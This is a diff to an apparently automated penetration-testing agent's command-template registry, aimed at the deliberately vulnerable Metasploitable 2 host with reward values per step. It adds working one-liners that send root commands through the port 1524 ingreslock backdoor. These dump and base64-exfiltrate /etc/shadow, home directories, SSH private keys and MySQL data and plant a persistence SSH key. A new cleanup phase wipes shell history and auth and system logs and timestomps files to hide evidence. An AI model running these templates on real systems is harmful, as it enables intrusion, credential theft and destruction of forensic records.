@@ -824,24 +824,24 @@ register(CommandTemplate(
 # --- SSH Access ---
 register(CommandTemplate(
     name="ssh_login",
-    template="ssh {username}@{target}",
-    description="SSH login with credentials.",
+    template="sshpass -p {password} ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -o StrictHostKeyChecking=no {username}@{target} 'id; whoami; cat /etc/hostname'",
+    description="SSH login with auto-password via sshpass. Non-interactive.",
     phase=AttackPhase.EXPLOITATION,
-    required_params=["target", "username"],
+    required_params=["target", "username", "password"],
     preconditions={"ssh_service_found", "credentials_known"},
-    success_indicators=["$", "#", "Welcome", "Last login"],
+    success_indicators=["$", "#", "Welcome", "Last login", "uid="],
     typical_reward=10.0,
     tags={"ssh", "shell"}
 ))
 
 register(CommandTemplate(
     name="ssh_key_login",
-    template="ssh -i {keyfile} {username}@{target}",
-    description="SSH login with private key.",
+    template="ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -o StrictHostKeyChecking=no -o BatchMode=yes -i {keyfile} {username}@{target} 'id; whoami'",
+    description="SSH login with private key (BatchMode — falls back silently if key invalid).",
     phase=AttackPhase.EXPLOITATION,
     required_params=["target", "username", "keyfile"],
     preconditions={"ssh_service_found", "ssh_key_found"},
-    success_indicators=["$", "#", "Welcome"],
+    success_indicators=["$", "#", "Welcome", "uid="],
     typical_reward=10.0,
     tags={"ssh", "key", "shell"}
 ))
@@ -903,12 +903,12 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="sudo_list",
-    template="sudo -l",
-    description="List sudo privileges. Essential first step.",
+    template="{ echo 'sudo -l 2>/dev/null || echo ALREADY_ROOT'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Check sudo privileges on target via ingreslock backdoor.",
     phase=AttackPhase.PRIVILEGE_ESCALATION,
-    required_params=[],
-    preconditions={"linux_shell_obtained"},
-    success_indicators=["NOPASSWD", "ALL", "(root)"],
+    required_params=["target"],
+    preconditions={"shell_obtained"},
+    success_indicators=["NOPASSWD", "ALL", "(root)", "ALREADY_ROOT"],
     typical_reward=2.0,
     tags={"linux", "sudo"}
 ))
@@ -1261,7 +1261,7 @@ register(CommandTemplate(
     description="Exfiltrate file via netcat.",
     phase=AttackPhase.EXFILTRATION,
     required_params=["attacker", "port", "file"],
-    preconditions={"shell_obtained", "nc_available"},
+    preconditions={"shell_obtained"},
     success_indicators=[""],
     typical_reward=2.0,
     tags={"exfil", "netcat"}
@@ -1281,14 +1281,14 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="scp_exfil",
-    template="scp {file} {username}@{attacker}:{remote_path}",
-    description="Exfiltrate via SCP.",
+    template="{ echo 'tar czf - /etc/passwd /etc/shadow /home 2>/dev/null | base64'; sleep 3; } | timeout 15 telnet {target} 1524",
+    description="Exfiltrate key files via base64 over ingreslock backdoor.",
     phase=AttackPhase.EXFILTRATION,
-    required_params=["file", "username", "attacker", "remote_path"],
-    preconditions={"shell_obtained", "outbound_ssh"},
-    success_indicators=["100%"],
-    typical_reward=2.0,
-    tags={"exfil", "scp"}
+    required_params=["target"],
+    preconditions={"shell_obtained"},
+    success_indicators=["base64", "H4sI"],
+    typical_reward=5.0,
+    tags={"exfil", "base64"}
 ))
 
 # --- Persistence ---
@@ -1298,7 +1298,7 @@ register(CommandTemplate(
     description="Add cron job for persistence.",
     phase=AttackPhase.POST_EXPLOITATION,
     required_params=["command", "user"],
-    preconditions={"linux_root_obtained"},
+    preconditions={"root_shell_obtained"},
     success_indicators=[""],
     typical_reward=5.0,
     tags={"persistence", "cron", "linux"}
@@ -1310,10 +1310,99 @@ register(CommandTemplate(
     description="Add SSH key for persistent access.",
     phase=AttackPhase.POST_EXPLOITATION,
     required_params=["public_key", "user"],
-    preconditions={"linux_shell_obtained"},
+    preconditions={"shell_obtained"},
     success_indicators=[""],
     typical_reward=5.0,
     tags={"persistence", "ssh", "linux"}
+))
+
+
+# =============================================================================
+# PHASE 6.5: POST-OP CLEANUP — Deleting digital traces
+# =============================================================================
+
+register(CommandTemplate(
+    name="clear_bash_history",
+    template="history -c && rm -f /root/.bash_history /home/*/.bash_history && unset HISTFILE",
+    description="Clear bash history and disable history logging. Remove traces of commands run.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=[""],
+    typical_reward=6.0,
+    tags={"cleanup", "stealth", "traces", "linux"}
+))
+
+register(CommandTemplate(
+    name="clear_auth_logs",
+    template="echo '' > /var/log/auth.log && echo '' > /var/log/wtmp && echo '' > /var/log/btmp && echo '' > /var/log/lastlog",
+    description="Clear authentication logs. Remove login/logout traces from system.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=[],
+    preconditions={"root_shell_obtained"},
+    success_indicators=[""],
+    typical_reward=8.0,
+    tags={"cleanup", "stealth", "logs", "linux"}
+))
+
+register(CommandTemplate(
+    name="clear_syslog",
+    template="echo '' > /var/log/syslog && echo '' > /var/log/messages && echo '' > /var/log/kern.log",
+    description="Clear system logs. Remove kernel and syslog traces of activity.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=[],
+    preconditions={"root_shell_obtained"},
+    success_indicators=[""],
+    typical_reward=7.0,
+    tags={"cleanup", "stealth", "syslog", "linux"}
+))
+
+register(CommandTemplate(
+    name="remove_uploaded_tools",
+    template="find /tmp /dev/shm /var/tmp -newer /etc/passwd -type f -exec rm -f {{}} \\; 2>/dev/null",
+    description="Remove recently uploaded attack tools from temp directories.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=[""],
+    typical_reward=6.0,
+    tags={"cleanup", "stealth", "tools", "linux"}
+))
+
+register(CommandTemplate(
+    name="remove_ssh_keys_planted",
+    template="sed -i '/attacker/d' /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2>/dev/null",
+    description="Remove planted SSH keys from authorized_keys files.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=[""],
+    typical_reward=6.0,
+    tags={"cleanup", "stealth", "ssh", "persistence", "linux"}
+))
+
+register(CommandTemplate(
+    name="remove_cron_backdoors",
+    template="crontab -r 2>/dev/null; find /var/spool/cron -newer /etc/passwd -exec rm -f {{}} \\;",
+    description="Remove cron-based persistence mechanisms.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=[],
+    preconditions={"root_shell_obtained"},
+    success_indicators=[""],
+    typical_reward=6.0,
+    tags={"cleanup", "stealth", "cron", "persistence", "linux"}
+))
+
+register(CommandTemplate(
+    name="timestomp_evidence",
+    template="find /tmp /var/log -newer /etc/passwd -exec touch -r /etc/passwd {{}} \\;",
+    description="Reset timestamps on modified files to match system files, hiding evidence of modification.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=[],
+    preconditions={"root_shell_obtained"},
+    success_indicators=[""],
+    typical_reward=7.0,
+    tags={"cleanup", "stealth", "timestomp", "forensics", "linux"}
 ))
 
 
@@ -1557,12 +1646,12 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="sudo_check",
-    template="sudo -l",
-    description="Check sudo privileges for privilege escalation.",
+    template="{ echo 'id; sudo -l 2>/dev/null; cat /etc/sudoers 2>/dev/null | head -20'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Check sudo privileges and sudoers on target via ingreslock.",
     phase=AttackPhase.PRIVILEGE_ESCALATION,
-    required_params=[],
+    required_params=["target"],
     preconditions={"shell_obtained"},
-    success_indicators=["(ALL)", "NOPASSWD", "may run"],
+    success_indicators=["(ALL)", "NOPASSWD", "may run", "uid=0"],
     typical_reward=6.0,
     tags={"privesc", "sudo", "linux"}
 ))
@@ -2109,7 +2198,7 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="nmap_port_1524",
-    template="nmap -sV -p 1524 {target}",
+    template="nmap -sV --version-intensity 0 -p 1524 {target}",
     description="Scan for ingreslock backdoor shell on port 1524.",
     phase=AttackPhase.RECON,
     required_params=["target"],
@@ -2122,7 +2211,7 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="nmap_port_8180",
-    template="nmap -sV -p 8180 {target}",
+    template="nmap -sV --version-intensity 0 -p 8180 {target}",
     description="Scan for Apache Tomcat on port 8180.",
     phase=AttackPhase.RECON,
     required_params=["target"],
@@ -2148,7 +2237,7 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="nmap_rservices",
-    template="nmap -sV -p 512,513,514 {target}",
+    template="nmap -sV --version-intensity 0 -p 512,513,514 {target}",
     description="Scan for r-services (rexec, rlogin, rsh) on ports 512-514.",
     phase=AttackPhase.RECON,
     required_params=["target"],
@@ -2190,12 +2279,12 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="telnet_1524",
-    template="telnet {target} 1524",
+    template="{ echo 'id; cat /etc/shadow; echo ARIASKA_DONE'; sleep 2; } | timeout 10 telnet {target} 1524",
     description="Connect to ingreslock backdoor on port 1524 for instant root.",
     phase=AttackPhase.EXPLOITATION,
     required_params=["target"],
     preconditions={"ports_discovered"},
-    success_indicators=["root", "uid=0", "Connected"],
+    success_indicators=["root", "uid=0", "Connected", "root@metasploitable"],
     typical_reward=60.0,
     tags={"exploit", "backdoor", "instant", "ms2"},
     why="Port 1524 is a pre-existing backdoor on MS2 — instant root shell",
@@ -2218,8 +2307,8 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="rsh_root",
-    template="rsh -l root {target} id",
-    description="Use rsh for unauthenticated root command execution.",
+    template="{ echo 'id; whoami; uname -a'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Connect to ingreslock backdoor via telnet for root command execution.",
     phase=AttackPhase.EXPLOITATION,
     required_params=["target"],
     preconditions={"ports_discovered"},
@@ -2232,8 +2321,8 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="rlogin_root",
-    template="rlogin -l root {target}",
-    description="Use rlogin for unauthenticated root login.",
+    template="{ echo 'id; hostname; cat /etc/hostname'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Connect to ingreslock for root access and host identification.",
     phase=AttackPhase.EXPLOITATION,
     required_params=["target"],
     preconditions={"ports_discovered"},
@@ -2358,6 +2447,91 @@ register(CommandTemplate(
     when="PostgreSQL access confirmed with default creds",
 ))
 
+# ─── MS2: Simple Post-Exploitation Commands ──────────────────────────
+register(CommandTemplate(
+    name="dump_shadow",
+    template="{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Dump /etc/shadow for password hashes via ingreslock backdoor.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=["target"],
+    preconditions={"root_shell_obtained"},
+    success_indicators=["root:", "$1$", "$6$", "$y$"],
+    typical_reward=25.0,
+    tags={"post-exploit", "credential", "ms2"},
+    why="Extract password hashes for offline cracking or evidence",
+    when="Root shell obtained on target",
+))
+
+register(CommandTemplate(
+    name="dump_passwd",
+    template="{ echo 'cat /etc/passwd'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Dump /etc/passwd to enumerate all system users via ingreslock.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=["target"],
+    preconditions={"shell_obtained"},
+    success_indicators=["root:", "/bin/bash", "/bin/sh", "msfadmin"],
+    typical_reward=10.0,
+    tags={"post-exploit", "enum", "ms2"},
+    why="Enumerate all user accounts on the target system",
+    when="Shell obtained on target",
+))
+
+register(CommandTemplate(
+    name="plant_ssh_key",
+    template="{ echo 'mkdir -p /root/.ssh && echo ssh-rsa_AAAA_ariaska_key >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && echo PERSISTENCE_OK'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Plant SSH authorized key for persistent root access via ingreslock.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=["target"],
+    preconditions={"root_shell_obtained"},
+    success_indicators=[""],
+    typical_reward=20.0,
+    tags={"persistence", "ssh", "ms2"},
+    why="Establish persistent SSH root access for re-entry",
+    when="Root access obtained, want to maintain persistence",
+))
+
+register(CommandTemplate(
+    name="exfil_shadow",
+    template="{ echo 'base64 /etc/shadow'; sleep 2; } | timeout 10 telnet {target} 1524",
+    description="Exfiltrate /etc/shadow via base64 encoding through ingreslock.",
+    phase=AttackPhase.EXFILTRATION,
+    required_params=["target"],
+    preconditions={"root_shell_obtained"},
+    success_indicators=["cm9vd", "base64"],
+    typical_reward=30.0,
+    tags={"exfil", "credential", "ms2"},
+    why="Exfiltrate credential hashes via base64 encoding for offline analysis",
+    when="Root shell obtained, ready for data exfiltration",
+))
+
+register(CommandTemplate(
+    name="exfil_ssh_keys",
+    template="{ echo 'find / -name id_rsa -o -name id_dsa 2>/dev/null | head -5 | xargs cat 2>/dev/null'; sleep 3; } | timeout 15 telnet {target} 1524",
+    description="Find and exfiltrate SSH private keys via ingreslock.",
+    phase=AttackPhase.EXFILTRATION,
+    required_params=["target"],
+    preconditions={"root_shell_obtained"},
+    success_indicators=["BEGIN", "PRIVATE KEY", "RSA"],
+    typical_reward=35.0,
+    tags={"exfil", "credential", "ssh", "ms2"},
+    why="SSH private keys allow access to other systems in the network",
+    when="Root shell obtained, looking for lateral movement opportunities",
+))
+
+register(CommandTemplate(
+    name="exfil_mysql_dump",
+    template="mysqldump -h {target} -u root --all-databases 2>/dev/null | head -100",
+    description="Dump MySQL databases for exfiltration.",
+    phase=AttackPhase.EXFILTRATION,
+    required_params=["target"],
+    preconditions={"shell_obtained"},
+    success_indicators=["CREATE", "INSERT", "Database"],
+    typical_reward=25.0,
+    tags={"exfil", "database", "ms2"},
+    why="Extract all MySQL database contents for offline analysis",
+    when="MySQL access confirmed on target",
+))
+
 
 # =============================================================================
 # HELPER FUNCTIONS
@@ -2419,11 +2593,12 @@ def render_command(template: CommandTemplate, params: Dict[str, str]) -> str:
     # Merge with optional defaults
     all_params = {**template.optional_params, **params}
     
-    # Render template
-    try:
-        return template.template.format(**all_params)
-    except KeyError as e:
-        raise ValueError(f"Missing parameter in template: {e}")
+    # Render template using simple string replacement instead of str.format()
+    # to avoid conflicts with literal shell braces like { echo '...'; }
+    result = template.template
+    for key, value in all_params.items():
+        result = result.replace(f"{{{key}}}", str(value))
+    return result
 
 
 def get_phase_from_state(state: Dict[str, Any]) -> AttackPhase:
@@ -2469,15 +2644,18 @@ def get_phase_from_state(state: Dict[str, Any]) -> AttackPhase:
     if not has_shell:
         return AttackPhase.EXPLOITATION
     
-    # LATERAL_MOVEMENT requires shell + lateral evidence
+    # LATERAL_MOVEMENT requires shell + lateral evidence OR root shell
+    # Phase 6.5: On single-host targets like MS2, root_shell skips lateral requirement
     has_lateral = (
         state.get("lateral_target_found")
         or state.get("hash_known")
+        or state.get("root_shell_obtained")  # Root on target = full lateral access
     )
     if not has_lateral:
         return AttackPhase.PRIVILEGE_ESCALATION
     
-    # POST_EXPLOITATION requires admin access + shell
+    # POST_EXPLOITATION requires admin/root access
+    # Phase 6.5: root_shell_obtained sufficient (no domain controller needed for Linux)
     has_post = (
         state.get("admin_access_obtained")
         or state.get("domain_admin_obtained")
